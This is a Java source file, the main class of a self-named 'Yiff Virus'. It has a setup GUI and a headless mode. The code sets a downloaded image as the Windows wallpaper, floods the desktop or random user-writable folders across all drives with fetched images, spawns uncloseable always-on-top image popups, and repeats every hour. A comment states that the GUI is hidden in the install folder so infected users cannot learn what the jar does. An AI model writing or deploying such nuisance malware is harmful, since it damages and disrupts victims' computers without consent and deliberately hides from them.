package me.bannock.virus;


import com.formdev.flatlaf.FlatDarculaLaf;
import com.google.gson.Gson;
import me.bannock.virus.images.ImageProviderService;
import me.bannock.virus.images.impl.TestImageProviderService;
import me.bannock.virus.utils.MiscUtils;
import me.bannock.virus.utils.StartOnWindowsStartUtil;
import me.bannock.virus.utils.WindowsUtils;

import javax.imageio.ImageIO;
import javax.swing.ImageIcon;
import javax.swing.JFrame;
import javax.swing.JLabel;
import java.awt.HeadlessException;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.Timer;
import java.util.TimerTask;

public class YiffVirus extends JFrame implements Runnable {

    static{
        FlatDarculaLaf.setup();
    }

    private Config config = new Config();
    private ImageProviderService imageProviderService = new TestImageProviderService();

    public static final YiffVirus INSTANCE = new YiffVirus();

    protected static final File HEADLESS_CONFIG_FILE = new File(StartOnWindowsStartUtil.VIRUS_INSTALL_DIR, "msg.json");

    private HashMap<File, File> fullyMappedDirs = null;

    /**
     * Creates a new gui window
     * @throws HeadlessException Whenever it feels like it
     */
    public YiffVirus() throws HeadlessException {
        setSize(450, 450);
        setResizable(false);
        setDefaultCloseOperation(EXIT_ON_CLOSE);
        setTitle("Yiff Virus");
        setContentPane(new VirusSetupForm(config, this).getForm());
    }

    /**
     * Entry point for application
     * @param args
     */
    public static void main(String[] args) {

        // Show the gui if the user wants a gui, autoload if the user configured it to autoload
        boolean showGui = true;
        for (String arg : args){
            switch(arg.toLowerCase()){
                case "-headless":{
                    showGui = false;
                    if (HEADLESS_CONFIG_FILE.exists()) {
                        try {
                            INSTANCE.setConfig(new Gson().fromJson(Files.readString(HEADLESS_CONFIG_FILE.toPath()), Config.class));
                        } catch (Exception ignored) {}
                    }
                    INSTANCE.run();
                }break;
            }
        }

        // If the jar is loaded from the virus install dir then do not show the gui, this is done so an infected user cannot
        // find out the purpose of the jar just by double-clicking it and reading the window title
        if (new File("").getAbsolutePath().equals(StartOnWindowsStartUtil.VIRUS_INSTALL_DIR.getAbsolutePath()))
            showGui = false;

        // Display gui if wanted by user
        if (showGui)
            INSTANCE.setVisible(true);

    }

    /**
     * Starts running the virus, locks thread
     */
    @Override
    public void run() {
        // If the window is still visible then hide and dispose it
        if (INSTANCE.isVisible()) {
            INSTANCE.setVisible(false);
            INSTANCE.dispose();
        }

        // Set image provider from config
        this.imageProviderService = config.getImageProvidmurr();

        // Dirs used by multiple options
        final File userHomeDir = new File(System.getProperty("user.home"));
        final File userDesktopDir = new File(userHomeDir, "/Desktop");

        // Set background
        if (config.shouldChangeBackground()){
            File bg = new File(StartOnWindowsStartUtil.WINDOWS_APPDATA_ROAMING,
                    "/" + Long.toString(System.currentTimeMillis(), Character.MAX_RADIX) + ".png");
            try {
                Files.write(bg.toPath(),
                        imageProviderService.fetchBytes(getImageProviderService().fetchImages(1).get(0)));
                WindowsUtils.changeBackground(bg.getAbsolutePath());
            } catch (IOException ignored) {}
        }

        // Image flood
        if (config.shouldImageFlood()){

            new Thread(() -> {
                // Get a random non admin dir on drive to write to
                if (config.shouldScatterAcrossDrive() && fullyMappedDirs == null){
                    fullyMappedDirs = new HashMap<>();
                    for (File drive : File.listRoots()){
                        if (!drive.canExecute())
                            continue;
                        MiscUtils.getNonAdminDirectories(drive, fullyMappedDirs);
                    }
                }

                // Get images
                List<String> images = getImageProviderService().fetchImages(config.getImageAmount());
                for (String url : images){
                    try {
                        File imageFile = new File(userDesktopDir, Long.toString(System.nanoTime(), Character.MAX_RADIX) +
                                "." + url.split("\\.")[url.split("\\.").length - 1]);
                        if (config.shouldScatterAcrossDrive()){
                            // Select random dir to write to
                            File dir = fullyMappedDirs.values().stream().skip((int)(Math.random() * fullyMappedDirs.size()) - 1).findFirst().get();
                            imageFile = new File(dir, Long.toString(System.nanoTime(), Character.MAX_RADIX) +
                                    "." + url.split("\\.")[url.split("\\.").length - 1]);
                        }
                        if (imageFile.exists())
                            continue; // We don't want to accidentally write over another file

                        // Write the image to the file
                        Files.write(imageFile.toPath(), getImageProviderService().fetchBytes(url));
                    } catch (Exception ignored) {
                        ignored.printStackTrace();
                    }

                }
            }).start();

        }

        // TODO: Set default user icon
        // C:\ProgramData\Microsoft\User Account Pictures

        // TODO: Set folder icons

        // Takes images from the provider and opens them in many window popups
        if (config.shouldPopupImages()){
            List<String> images = getImageProviderService().fetchImages(25);
            // Gets the size of the screen
            int screenWidth = (int) java.awt.Toolkit.getDefaultToolkit().getScreenSize().getWidth();
            // Create new popups
            new Thread(() -> {
                for (String url : images){

                    // Loads image
                    byte[] bytes = getImageProviderService().fetchBytes(url);
                    try (InputStream in = new ByteArrayInputStream(bytes)) {
                        BufferedImage image = ImageIO.read(in);

                        // Creates popup window
                        JFrame popup = new JFrame();
                        popup.setSize(image.getWidth(), image.getHeight());
                        popup.setUndecorated(true);
                        popup.setAlwaysOnTop(true);
                        popup.setResizable(false);
                        JLabel imageLabel = new JLabel();
                        imageLabel.setIcon(new ImageIcon(image));
                        popup.setContentPane(imageLabel);
                        popup.setDefaultCloseOperation(DO_NOTHING_ON_CLOSE);
                        popup.setTitle(Long.toString(System.nanoTime(), Character.MAX_RADIX));
                        popup.setFocusable(false);
                        popup.setFocusableWindowState(false);
                        popup.setType(Type.UTILITY);

                        // Set the position of the window to a random point on screen, handles window size to not go off screen
                        popup.setLocation((int) (Math.random() * (screenWidth - popup.getWidth())),
                                (int) (Math.random() * (java.awt.Toolkit.getDefaultToolkit().getScreenSize().getHeight()
                                        - popup.getHeight())));
                        // Show the window
                        popup.setVisible(true);
                    } catch (IOException ignored) {}
                }
            }).start();
        }


        // Repeated hourly if wanted
        if (config.shouldRunHourly()){
            final Runnable goober = this;
            new Timer().schedule(new TimerTask() {
                @Override
                public void run() {
                    goober.run();
                }
            }, 1000 * 60 * 60);
        }
    }

    public void setConfig(Config config) {
        this.config = config;
    }

    public ImageProviderService getImageProviderService() {
        return imageProviderService;
    }
}
